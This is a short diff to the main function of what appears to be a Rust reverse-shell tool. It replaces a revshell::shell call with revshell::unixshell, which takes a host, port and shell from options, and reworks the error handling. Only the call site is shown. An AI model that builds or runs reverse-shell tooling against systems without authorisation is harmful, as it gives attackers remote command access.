@@ -83,10 +83,10 @@ fn main() {
             return;
         };
         
-        let revshell_return = revshell::shell(opt_host, opt_port, opt_shell);
-        if !revshell_return.is_empty(){
-            print_error(revshell_return)
-        }
+
+        if let Err(err) = revshell::unixshell(opt_host.to_string(), opt_port.to_string(), opt_shell) {
+            print_error(err.to_string());
+        } 
         return;
     }
 
